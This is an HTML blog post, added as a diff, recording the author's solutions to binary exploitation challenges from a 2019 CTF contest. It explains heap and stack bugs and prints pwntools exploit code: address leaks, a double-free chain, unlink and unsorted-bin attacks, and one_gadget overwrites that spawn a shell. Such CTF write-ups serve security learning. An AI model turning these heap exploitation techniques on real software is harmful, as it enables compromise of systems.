@@ -1,0 +1,391 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<!--
+//                            _ooOoo_
+//                           o8888888o
+//                           88" . "88
+//                           (| -_- |)
+//                            O\ = /O
+//                        ____/`---'\____
+//                      .   ' \\| |// `.
+//                       / \\||| : |||// \
+//                     / _||||| -:- |||||- \
+//                       | | \\\ - /// | |
+//                     | \_| ''\---/'' | |
+//                      \ .-\__ `-` ___/-. /
+//                   ___`. .' /--.--\ `. . __
+//                ."" '< `.___\_<|>_/___.' >'"".
+//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
+//                 \ \ `-. \_ __\ /__ _/ .-` / /
+//         ======`-.____`-.___\_____/___.-`____.-'======
+//                            `=---='
+//                 拦截插件累计拦截逗比攻击"1381438"次！
+//         .............................................
+//                  佛祖保佑             永无BUG
+//          佛曰:
+//                  写字楼里写字间，写字间里程序员；
+//                  程序人员写程序，又拿程序换酒钱。
+//                  酒醒只在网上坐，酒醉还来网下眠；
+//                  酒醉酒醒日复日，网上网下年复年。
+//                  但愿老死电脑间，不愿鞠躬老板前；
+//                  奔驰宝马贵者趣，公交自行程序员。
+//                  别人笑我忒疯癫，我笑自己命太贱；
+//                  不见满街漂亮妹，哪个归得程序员？
+-->
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://yoursite.com/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://yoursite.com">
+<meta name="author" content="treebacker">
+<link rel="stylesheet" href="../../../../css/SimpleStyle.min.css">
+
+<link rel="shortcut icon" href="../../../../images/favicon.png">
+
+
+<title>第五空间pwn记录 - Watch Security</title>
+
+<meta name="keywords" content="Reverse, Security, New">
+
+<meta name="description " content="">
+
+</head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="Tree">Tree</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>首页</span></a>
+        <a href="/archives" title="归档"><i class="fa fa-archives"></i><span>归档</span></a>
+        <a href="/tags" title="标签"><i class="fa fa-tags"></i><span>标签</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-telegram"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">Treebacker</h1>
+        <h3 class="cover-siteTitle">愿麦子和麦子长在一起，愿河流与河流流归一处。</h3>
+        <p class="cover-siteDesc">Tech and Eesay</p>
+        <div class="cover-sns">
+            
+            <div class="btn btn-github">
+                <a href="https://github.com/treebacker" target="_blank" title="github" ref="friend">
+                    <i class="fa fa-github"></i>
+                </a>
+            </div>
+            
+        </div>
+    </div>
+</div>
+            <div class="page-title">
+    <ul>
+        <li><a href="/">最新</a></li>
+        
+            
+                <li class="active">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/essays" data-name="随笔">随笔</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/cdcitizen-of-the-sun" data-name="海子">海子</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/others" data-name="其他">其他</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <label for="s" class="sr-only">请输入关键字</label>
+        <input class="search-field" type="text" name="s" placeholder="请输入关键字">
+        <button type="submit" class="search-form-submit" title="搜索"><i class="fa fa-search"></i></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词...">
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(无标题)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '../../../../content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="" target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar">
+                </a>
+                <p><span class="label">作者</span>
+                    <a href="" target="_blank">Treebacker</a>
+                    <span title="最后编辑于2019-09-12">2019-09-12</span>
+                </p>
+                <p></p>
+            </div>
+            <h2 class="post-title">第五空间pwn记录</h2>
+            <div class="post-meta">
+                本文总共4165个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><h5 id="8月末打了场第五空间比赛，pwn题很多，但是环境问题头疼。找了点时间复现一下。"><a href="#8月末打了场第五空间比赛，pwn题很多，但是环境问题头疼。找了点时间复现一下。" class="headerlink" title="8月末打了场第五空间比赛，pwn题很多，但是环境问题头疼。找了点时间复现一下。"></a>8月末打了场第五空间比赛，pwn题很多，但是环境问题头疼。找了点时间复现一下。</h5><h4 id="题目-bf"><a href="#题目-bf" class="headerlink" title="题目 bf"></a>题目 bf</h4><ul>
+<li><h5 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h5><ul>
+<li><p>缓冲区溢出造成覆盖srand的种子变量seed，可以预知数字，从而绕过。</p>
+<img src="/2019/09/12/第五空间pwn记录/1.png" title="[]">
+<img src="/2019/09/12/第五空间pwn记录/2.png" title="[]">
+</li>
+<li><p>格式化字符串、缓冲区溢出，ret2libc方式get shell</p>
+<img src="/2019/09/12/第五空间pwn记录/3.png" title="[]">
+</li>
+</ul>
+</li>
+<li><h5 id="特别的"><a href="#特别的" class="headerlink" title="特别的"></a>特别的</h5><ul>
+<li>这题目开启了PIE，当我用格式化字符串利用的时候，elf的基地址得不到，构造rop的pop_ret链子其实可以从libc文件获得。（前提是知道了libc文件）</li>
+<li>如果设置返回地址为main，泄露信息和get shell分开来，当然就可以分别泄露elf文件加载基地址和libc文件基地址。</li>
+</ul>
+</li>
+</ul>
+<h4 id="题目-hard2"><a href="#题目-hard2" class="headerlink" title="题目 hard2"></a>题目 hard2</h4><ul>
+<li><p>漏洞</p>
+<ul>
+<li><p>这题目有些刁钻，看了很久没看出毛病。后来分析有这些漏洞</p>
+</li>
+<li><p>数组越界，导致可以free伪造的chunk。但是这里的输入数字，是只可以0-9的字符串，所以需要处理（有符号数，不带’-‘号）即负数的十进制表示。</p>
+<img src="/2019/09/12/第五空间pwn记录/13.png" title="[]">
+<img src="/2019/09/12/第五空间pwn记录/14.png" title="[]">
+</li>
+<li><p>从上面也可以看出，free是从后往前覆盖的。当idx超出46时，就会在数组中存在两个相同的chunk地址。</p>
+</li>
+<li><p>同时，利用负数也可以泄露地址，show功能。但是这里需要在.bss段构造一个got表项，这一点可以利用free掉cnt之前的地址，重新分配一个.bss上的chunk来实现</p>
+</li>
+</ul>
+</li>
+<li><p>漏洞利用</p>
+<ul>
+<li><p>地址泄露</p>
+<ul>
+<li><p>由于cnt的存在，即使array中存在多个相同指针（因为每次free后cnt[0]都减一，我们无法再访问高地址的array的值），也难以绕过判断，所以可以先覆盖cnt的值。这一目的可以由在cnt上构造fake chunk并free实现用pFunc覆盖cnt[0]。（因为free(null)是安全的，并且可以利用list链表向前覆盖达到用pFunc覆盖cnt[0]的目的）（注意由于比较时，取4byte且是有符号整数，所以如果恰好高位8时，就会失败out of range）。</p>
+</li>
+<li><p>之后，因为同一chunk指针在多个位置存储，就可以任意的利用use after free达到泄露地址的目的。</p>
+</li>
+<li><p>其中，文件加载基地址的泄露比较特殊。在list[-19]处存在一libc地址指针，里面是文件加载基地，所以直接show(-19)即可。</p>
+<img src="/2019/09/12/第五空间pwn记录/15.png" title="[]">
+</li>
+<li><p>libc的泄露要利用double free构成fd回环，造成任意地址写。在.bss段构造一个got表项。</p>
+</li>
+</ul>
+</li>
+<li><p>任意地址写</p>
+<ul>
+<li>同样利用double free，可以show泄露libc，也可以create写入数值</li>
+</ul>
+</li>
+<li><p>exp记录</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">leak process base address</span><br><span class="line">show(<span class="number">0xffffffff</span> - <span class="number">18</span>)</span><br><span class="line">p.recvuntil(<span class="string">'context: '</span>)</span><br><span class="line">procbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"procbase ==&gt; "</span> + hex(procbase)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">0x30</span>):			<span class="comment">#make cnt[0] = 0x2f so free will leavel two same pointers in array</span></span><br><span class="line">	create(str(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xd</span>):			<span class="comment">#make cnt[0] = 0x21, so make a fake chunk</span></span><br><span class="line">	free(<span class="number">0</span>)						</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#over write cnt</span></span><br><span class="line">free(<span class="number">0xffffffff</span> - <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#use after free</span></span><br><span class="line"><span class="comment">#leak heap</span></span><br><span class="line">free(<span class="number">0x2e</span>)							<span class="comment">#array[0x2e] == arrary[0x2f]</span></span><br><span class="line">show(<span class="number">0x2e</span>)</span><br><span class="line">p.recvuntil(<span class="string">'context: '</span>)</span><br><span class="line">heapbase = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x180</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"heapbase ==&gt; "</span> + hex(heapbase)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">free(<span class="number">0</span>)							<span class="comment">#</span></span><br><span class="line">free(<span class="number">0x2e</span>)						<span class="comment">#				</span></span><br><span class="line">free(<span class="number">0xffffffff</span> - <span class="number">5</span>)			<span class="comment">#free(0)    make cnt[0] = 0</span></span><br><span class="line"></span><br><span class="line">fake_chunk = <span class="number">0x202068</span> + procbase</span><br><span class="line">fake_got = fake_chunk + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#now chunk_2e -&gt; chunk0 -&gt; chunk-&gt;chunk_2    (double free chain)</span></span><br><span class="line">create(p64(procbase + <span class="number">0x202068</span>))			<span class="comment">#freed's 0x2e, fd</span></span><br><span class="line">create(<span class="string">'a'</span>*<span class="number">4</span>)								<span class="comment">#</span></span><br><span class="line">create(<span class="string">'b'</span>*<span class="number">4</span>)								<span class="comment">#freed's 0x2e</span></span><br><span class="line"></span><br><span class="line">create(p64(procbase + elf.got[<span class="string">'free'</span>]) + p64(<span class="number">0x21</span>))		<span class="comment">#fd, fake_got = free_got</span></span><br><span class="line">show(<span class="number">0xffffffff</span> - <span class="number">4</span>)				<span class="comment">#show(fake_chunk + 0x10)   here is free_got</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'context: '</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, 'b write')</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):			<span class="comment">#like before, </span></span><br><span class="line">	free(<span class="number">1</span>)					<span class="comment">#2e -&gt; 0 -&gt; 2e (double free chain)</span></span><br><span class="line">create(p64(procbase+<span class="number">0x202078</span>))</span><br><span class="line">create(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">create(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">gadgets = [<span class="number">0x4526a</span>, <span class="number">0x45216</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"><span class="comment">#Create(p64(libc_base+libc.symbols['system']))</span></span><br><span class="line">create(p64(libc_base+gadgets[<span class="number">2</span>]))</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="题目pwn10"><a href="#题目pwn10" class="headerlink" title="题目pwn10"></a>题目pwn10</h4><ul>
+<li>漏洞<ul>
+<li></li>
+</ul>
+</li>
+</ul>
+<h4 id="题目pwn-11"><a href="#题目pwn-11" class="headerlink" title="题目pwn 11"></a>题目pwn 11</h4><ul>
+<li><p>漏洞</p>
+<ul>
+<li><p>典型的栈溢出，且保护只有NX。</p>
+<img src="/2019/09/12/第五空间pwn记录/12.png" title="[]">
+</li>
+</ul>
+</li>
+<li><p>利用，ret2libc即可。</p>
+</li>
+</ul>
+<h4 id="题目pwn12"><a href="#题目pwn12" class="headerlink" title="题目pwn12"></a>题目pwn12</h4><ul>
+<li><p>漏洞</p>
+<ul>
+<li><p>数组越界访问，导致可以伪造chunk块，并free掉。造成任意地址写。</p>
+<img src="/2019/09/12/第五空间pwn记录/6.png" title="[]">
+</li>
+<li><p>null off by one漏洞，可以改写下一个chunk的size，造成unlink利用；</p>
+<img src="/2019/09/12/第五空间pwn记录/7.png" title="[]">
+</li>
+<li><p>但是前提是这个chunk的size是0x100的整数倍，就要求一个字段is_root非null。这点可以利用第一个漏洞实现绕过，即我们将is_root伪造为chunk，就可以free掉，这样就会将其插入unsorted bin，fd即是is_root，满足非null。</p>
+<img src="/2019/09/12/第五空间pwn记录/9.png" title="[]">
+</li>
+<li><p>另外，该程序不使用fastbin。所以可以直接利用unsorted bin 泄露libc地址</p>
+<img src="/2019/09/12/第五空间pwn记录/8.png" title="[]">
+</li>
+</ul>
+</li>
+<li><p>利用过程</p>
+<ul>
+<li><p>泄露地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>)			<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x28</span>)			<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x28</span>)			<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvline().strip(<span class="string">'\x0a'</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4ba8</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base ==&gt; "</span> + hex(libc_base)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>伪造chunk，free，使is_root非null，这里需要明确我们只能将is_root的地址写入某一可以由数组越界访问的地址，才可以free，并能伪造chunk，name和info字段 即可布置。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">init(p64(is_root)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>), p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)*<span class="number">5</span>)  </span><br><span class="line"></span><br><span class="line">delete(<span class="number">-38</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>unlink利用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x28</span>)			<span class="comment">#3	 </span></span><br><span class="line">add(<span class="number">0xf8</span>)			<span class="comment">#4	</span></span><br><span class="line"></span><br><span class="line">dbg()</span><br><span class="line">edit(<span class="number">3</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(user_chunk + <span class="number">0x30</span> <span class="number">-0x18</span>)+p64(user_chunk + <span class="number">0x30</span> <span class="number">-0x10</span>)+p64(<span class="number">0x20</span>))</span><br><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="题目pwn13"><a href="#题目pwn13" class="headerlink" title="题目pwn13"></a>题目pwn13</h4><ul>
+<li><p>漏洞</p>
+<ul>
+<li><p>栈溢出，0xa0个字节，且输入无’\x00’截断。</p>
+<img src="/2019/09/12/第五空间pwn记录/10.png" title="[]">
+</li>
+<li><p>存在getshell代码段，由于PIE, 且溢出字节有限，所以一定是覆盖ret地址的低2byte为getshell的地址。</p>
+<img src="/2019/09/12/第五空间pwn记录/11.png" title="[]">
+</li>
+</ul>
+</li>
+<li><p>漏洞利用</p>
+<ul>
+<li><p>泄露文件加载基地址，覆盖rbp即可，但是发现这样对后续利用有影响，</p>
+</li>
+<li><p>再次观察，getshell地址和ret地址。发现只需要覆盖最低位的一个字节即可。。。。。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span> + <span class="string">'\x50'</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="题目pwn14"><a href="#题目pwn14" class="headerlink" title="题目pwn14"></a>题目pwn14</h4><ul>
+<li><p>漏洞</p>
+<ul>
+<li><p>后门触发</p>
+<img src="/2019/09/12/第五空间pwn记录/4.png" title="[]">
+</li>
+<li><p>堆溢出</p>
+<img src="/2019/09/12/第五空间pwn记录/5.png" title="[]">
+</li>
+<li><p>很明显，利用unsorted bin attack技术改写那个地址的值较大，就可以触发后门，getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="string">'a'</span>*<span class="number">0x80</span>)</span><br><span class="line">create(<span class="string">'b'</span>*<span class="number">0x80</span>)</span><br><span class="line">create(<span class="string">'c'</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)			<span class="comment">#unsorted bin</span></span><br><span class="line">target_addr = <span class="number">0x4040A0</span> - <span class="number">0x10</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'a'</span>*<span class="number">0x80</span> + p64(<span class="number">0x90</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(target_addr))</span><br><span class="line"></span><br><span class="line">create(<span class="string">'v'</span>*<span class="number">0x80</span>)	<span class="comment">#bck-&gt;fd = ....</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">p.sendline(<span class="string">'70'</span>)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="题目pwn15"><a href="#题目pwn15" class="headerlink" title="题目pwn15"></a>题目pwn15</h4><ul>
+<li>漏洞<ul>
+<li>吐血，和pwn一样的后门。。。触发条件有着弱智般的变动。。。</li>
+</ul>
+</li>
+</ul>
+
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> 打赏
+            </a>
+        </div>
+        
+        <div class="post-tags">标签：
+            
+        </div>
+        
+    </article>
+    
+    <p>本文代表个人观点，内容仅供参考。若有不恰当之处，望不吝赐教！</p>
+    
+    
+</div>
+<script src="../../../../js/busuanzi.pure.mini.js"></script>
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner">
+        <p>
+            <a href="/about" title="关于本站">关于本站</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="help">急救中心</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/app" title="App下载">App下载</a>
+        </p>
+        <p>
+            本站点采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>，已建立<a href="/timeline" id="siteBuildingTime"></a>天<br>
+            ©2017 基于<a href="http://hexo.io" target="_blank">Hexo</a>搭建
+            ，主题&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank">JSimple</a>
+            ，作者<a href="https://www.tangkunyin.com" target="_blank">唐先森</a>
+            ，Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
+        </p>
+        
+
+    </div>
+</footer>
+<script src="../../../../js/InsightSearch.js"></script>
+<script src="../../../../js/SimpleCore.js"></script>
+
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        SimpleCore.init({
+            buildingTime: '11/22/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+        });
+    });
+</script>
+</body>
+</html>
